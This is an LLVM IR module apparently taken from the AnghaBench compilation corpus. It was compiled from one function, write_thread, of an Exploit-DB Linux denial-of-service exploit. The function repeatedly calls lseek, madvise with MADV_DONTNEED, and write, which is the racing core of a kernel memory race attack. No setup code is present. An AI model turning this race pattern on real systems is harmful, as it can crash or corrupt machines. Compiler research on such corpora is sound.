; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43199.c_write_thread.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43199.c_write_thread.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_args = type { i32, i32, i64, i64, i32 }

@TRIES_PER_PAGE = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@MAP_SIZE = common dso_local global i32 0, align 4
@MADV_DONTNEED = common dso_local global i32 0, align 4
@PAGE_SIZE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @write_thread(%struct.thread_args* %0) #0 {
  %2 = alloca %struct.thread_args*, align 8
  %3 = alloca i32, align 4
  store %struct.thread_args* %0, %struct.thread_args** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %44, %1
  %5 = load i32, i32* %3, align 4
  %6 = load i32, i32* @TRIES_PER_PAGE, align 4
  %7 = icmp slt i32 %5, %6
  br i1 %7, label %8, label %14

8:                                                ; preds = %4
  %9 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %10 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = icmp ne i32 %11, 0
  %13 = xor i1 %12, true
  br label %14

14:                                               ; preds = %8, %4
  %15 = phi i1 [ false, %4 ], [ %13, %8 ]
  br i1 %15, label %16, label %47

16:                                               ; preds = %14
  %17 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %18 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %17, i32 0, i32 1
  %19 = load i32, i32* %18, align 4
  %20 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %21 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %20, i32 0, i32 2
  %22 = load i64, i64* %21, align 8
  %23 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %24 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %23, i32 0, i32 3
  %25 = load i64, i64* %24, align 8
  %26 = add nsw i64 %22, %25
  %27 = trunc i64 %26 to i32
  %28 = load i32, i32* @SEEK_SET, align 4
  %29 = call i32 @lseek(i32 %19, i32 %27, i32 %28)
  %30 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %31 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %30, i32 0, i32 2
  %32 = load i64, i64* %31, align 8
  %33 = load i32, i32* @MAP_SIZE, align 4
  %34 = load i32, i32* @MADV_DONTNEED, align 4
  %35 = call i32 @madvise(i64 %32, i32 %33, i32 %34)
  %36 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %37 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %36, i32 0, i32 1
  %38 = load i32, i32* %37, align 4
  %39 = load %struct.thread_args*, %struct.thread_args** %2, align 8
  %40 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 8
  %42 = load i32, i32* @PAGE_SIZE, align 4
  %43 = call i32 @write(i32 %38, i32 %41, i32 %42)
  br label %44

44:                                               ; preds = %16
  %45 = load i32, i32* %3, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %3, align 4
  br label %4

47:                                               ; preds = %14
  ret i8* null
}

declare dso_local i32 @lseek(i32, i32, i32) #1

declare dso_local i32 @madvise(i64, i32, i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
